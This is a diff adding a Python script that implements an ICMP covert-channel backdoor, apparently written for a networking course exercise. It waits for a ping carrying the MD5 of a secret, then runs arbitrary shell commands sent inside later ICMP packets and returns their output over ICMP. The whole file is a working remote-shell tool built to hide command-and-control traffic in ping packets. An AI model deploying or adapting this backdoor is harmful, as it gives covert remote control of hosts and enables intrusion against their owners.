@@ -1,0 +1,125 @@
+#! /usr/bin/env python
+
+import os
+import sys
+import subprocess
+import hashlib
+import struct
+import socket
+
+ICMP_ECHO_REQUEST = 8
+
+# From Aufgabe 1 (ping):
+def receive_icmp(my_socket):
+    recPacket, addr = my_socket.recvfrom(1024)
+    header = recPacket[20:28]
+    payload = recPacket[28:]
+    return payload, addr[0]
+
+# From Aufgabe 1 (ping):
+def send_icmp(my_socket, dest_addr, payload):
+    dest_addr = socket.gethostbyname(dest_addr)
+    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, 0, 1)
+    packet = header + payload
+    my_socket.sendto(packet, (dest_addr, 1))
+
+def get_argument():
+    if len(sys.argv) != 3 or sys.argv[1] != "--secret":
+        print("Usage: {} --secret [SECRET]".format(sys.argv[0]))
+        exit()
+
+    return sys.argv[2]
+
+# A simple reverse shell:
+class ReverseShell:
+
+    def __init__(self):
+
+        self.cwd = os.getcwd()
+
+    def interact(self, cmd):
+
+        exit = False
+
+        # Run command:
+        proc = subprocess.Popen(
+            cmd.decode(),
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            cwd=self.cwd
+        )
+
+        # Get command output:
+        output = proc.communicate()[0]
+
+        # If the cd command succeeded, change the session's cwd:
+        if cmd[:2] == b'cd':
+            if proc.returncode == 0:
+                self.cwd = os.path.realpath(cmd[3:].decode())
+
+        # If the exit command suceeded, exit from the reverse shell as well:
+        elif cmd[:4] == b'exit':
+            if proc.returncode == 0:
+                exit = True
+
+        return exit, output.strip()
+
+if __name__ == '__main__':
+
+    # Parse arguments:
+    arg = get_argument()
+
+    # Get a md5sum of the secret:
+    secret = hashlib.md5(arg.encode()).digest()
+
+    # Open socket to send ICMP request:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
+
+    sessions = {}
+
+    while True:
+
+        payload, host = receive_icmp(sock)
+
+        if payload == secret:
+
+            print("Spawning reverse shell for host " + host)
+
+            # Random session id:
+            id = os.urandom(16)
+
+            # Spawn a reverse shell for the new session:
+            sessions[id] = (host, ReverseShell())
+
+            # Secret + id signals that the session was created:
+            send_icmp(sock, host, secret + id)
+
+        elif payload[:16] in sessions:
+
+            id = payload[:16]
+
+            # The command to be run comes right after the session id:
+            cmd = payload[16:]
+
+            session = sessions[id]
+
+            if session[0] == host:
+
+                # Retrieve shell handle for this session:
+                shell = session[1]
+
+                # Run command:
+                exit, output = shell.interact(cmd)
+
+                if exit:
+                    # The secret signals that the session ended:
+                    send_icmp(sock, host, id + secret + output)
+
+                    print("Destroying reverse shell for host " + host)
+
+                    del shell
+                    del sessions[id]
+                else:
+                    send_icmp(sock, host, id + output)
